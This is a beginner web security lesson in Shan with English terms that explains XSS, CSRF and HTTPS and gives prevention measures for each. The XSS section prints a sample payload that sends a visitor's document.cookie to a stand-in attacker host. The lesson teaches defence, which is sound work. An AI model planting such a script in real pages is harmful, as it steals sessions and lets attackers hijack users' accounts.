# Lesson 73: Web Security Basics

### 1. XSS (Cross-Site Scripting)

**XSS** ပဵၼ်ၵၢၼ်ဢၼ် Hacker "သႂ်ႇ" (Inject) JavaScript ဢၼ်မီးၽေး ၶဝ်ႈၵႂႃႇၼႂ်း Website ႁဝ်း။ ပၼ်ႁႃၼႆႉၵႆႉၵိူတ်ႇၶိုၼ်ႈတီႈ **Input Fields** (မိူၼ်ၼင်ႇ Comment box)။

* **မၼ်းႁဵတ်းႁိုဝ်:** Hacker တႅမ်ႈၵူတ်ႉ `<script>fetch('https://hacker.com?cookie=' + document.cookie)</script>` ဝႆႉၼႂ်း Comment။ ပေႃး User တၢင်ႇၵေႃႉမႃးလူ Comment ၼၼ်ႉ၊ JavaScript ၼၼ်ႉတေလႅၼ်ႈသေသူင်ႇ Cookie ၶွင် User ၵႂႃႇပၼ် Hacker ၵမ်းလဵဝ်ၶႃႈ။

#### 🛡️ လၢႆးႁႄႉၵင်ႈ (Prevention):

1. **Never trust user input:** ယႃႇလိုမ်းဝႃႈ ၵူၼ်းၸႂ်ႉၸၢင်ႈတႅမ်ႈသင်ၵေႃႈလႆႈ။
2. **Sanitize Output:** ၸႂ်ႉ `.textContent` တႅၼ်း `.innerHTML` (မိူၼ်ဢၼ်ႁဝ်းႁဵၼ်းမႃးၼႂ်း Lesson 65)။
3. **Content Security Policy (CSP):** ပဵၼ်ၵၢၼ်တင်ႈၵႃႈ (Configuration) တီႈ Server တွၼ်ႈတႃႇမွၵ်ႇ Browser ဝႃႈ "ပၼ်လႅၼ်ႈ Script ဢၼ်လုၵ်ႉတီႈ Domain ႁဝ်းမႃးၵူၺ်းၼႃ"။

---

### 2. CSRF (Cross-Site Request Forgery)

**CSRF** ပဵၼ်ၵၢၼ် "လႅၼ်" ႁႂ်ႈ Browser ၶွင် User သူင်ႇ Request ဢၼ်ၶဝ်ဢမ်ႇလႆႈတင်ႈၸႂ် ၵႂႃႇၸူး Website ဢၼ်ၶဝ် Login ဝႆႉယူႇၼၼ်ႉၶႃႈ။

* **မၼ်းႁဵတ်းႁိုဝ်:** ၸဝ်ႈၵဝ်ႇ Login Facebook ဝႆႉယူႇ၊ သေၸဝ်ႈၵဝ်ႇၵႂႃႇၼဵၵ်း Link တီႈ Website တၢင်ႇဢၼ်။ Link ၼၼ်ႉတေၸၢင်ႈ "လၵ်ႉ" သူင်ႇ Request ၵႂႃႇတီႈ Facebook ႁႂ်ႈ Post လိၵ်ႈသေၸိူဝ်ႉသေယၢင်ႇလူၺ်ႈၸိုဝ်ႈၸဝ်ႈၵဝ်ႇ၊ ယွၼ်ႉ Browser တေသူင်ႇ Cookie (Session) ၵႂႃႇၸွမ်းတႃႇသေႇၶႃႈ။

#### 🛡️ လၢႆးႁႄႉၵင်ႈ (Prevention):

1. **Anti-CSRF Tokens:** သူင်ႇ "ၵူတ်ႉလပ်ႉ" (Token) ဢၼ်ၵိူတ်ႇၶိုၼ်ႈၸူဝ်ႈၶၢဝ်ႇ ၵႂႃႇၸွမ်း Form ၵူႈပွၵ်ႈ။ Server တေၵူတ်ႇထတ်း Token ၼၼ်ႉၵွၼ်ႇ ၸင်ႇတေႁဵတ်းၵၢၼ်ပၼ်။
2. **SameSite Cookie Attribute:** တင်ႈၵႃႈ Cookie ႁႂ်ႈပဵၼ် `SameSite=Strict` ႁိုဝ် `Lax` တွၼ်ႈတႃႇႁႄႉၵင်ႈ Browser ဢမ်ႇႁႂ်ႈသူင်ႇ Cookie ၵႂႃႇၸူး Website တၢင်ႇဢၼ်ၶႃႈ။

---

### 3. HTTPS (Secure Connection)

လွင်ႈပိုၼ်ႉထၢၼ်သုတ်းပဵၼ်ၵၢၼ်ၸႂ်ႉ **HTTPS**။ မၼ်းတေ "ႁေႃႇလပ်ႉ" (Encrypt) ၶေႃႈမုၼ်းဢၼ်လႅၼ်ႈၵႂႃႇမႃး ၼိူဝ် Internet တင်းမူတ်း။ သင် Hacker ၸၵ်ႉဢဝ်ၶေႃႈမုၼ်းလႆႈၵေႃႈ ၶဝ်တေလူဢမ်ႇဢွၵ်ႇၶႃႈ။

---

### 📝 ၶေႃႈမုၼ်းတႃႇတွၼ်း (Key Takeaway)

* **XSS** ပဵၼ်ၵၢၼ်လႅၵ်ႈလၢႆႈ Website ႁဝ်း (Frontend Attack)။
* **CSRF** ပဵၼ်ၵၢၼ် "ၸႂ်ႉ" သိတ်ႉထိၶွင် User ႁဝ်း (Session Attack)။
* ပၵ်းပိူင်လမ်ႇလွင်ႈသုတ်း: **"Sanitize inputs on the client, and validate inputs on the server."** (ၵူတ်ႇထတ်းၶေႃႈမုၼ်းတင်းၽၢႆႇၼႃႈ လႄႈ ၽၢႆႇလင်) ၶႃႈ။

---
